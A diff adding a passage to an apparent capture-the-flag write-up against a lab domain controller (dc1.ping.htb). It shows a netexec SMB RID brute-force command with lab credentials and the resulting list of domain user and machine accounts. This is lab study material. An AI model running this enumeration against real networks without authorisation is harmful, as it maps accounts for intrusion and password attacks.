@@ -159,3 +159,37 @@ SMB         dc1.ping.htb    445    dc1              [*] Enumerated 25 local user
 
 Ill get the users and the user account descriptions
 
+```python
+❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC1$
+pong$
+M.Russell
+G.Lorents
+Z.Iskam
+M.Wallace
+P.Paul
+A.Gordon
+P.Klain
+C.Roberts
+gMSA$
+S.Zhoski
+R.Miller
+A.Adam
+R.Robins
+P.Pollek
+O.Plinski
+V.Vodomir
+D.MacKenzie
+P.Vandeval
+T.Yang
+N.Neri
+W.Williams
+K.Podroski
+G.James
+```
+
+Ill use the rid brute flag since this also pulls machine accounts to get a user file
+
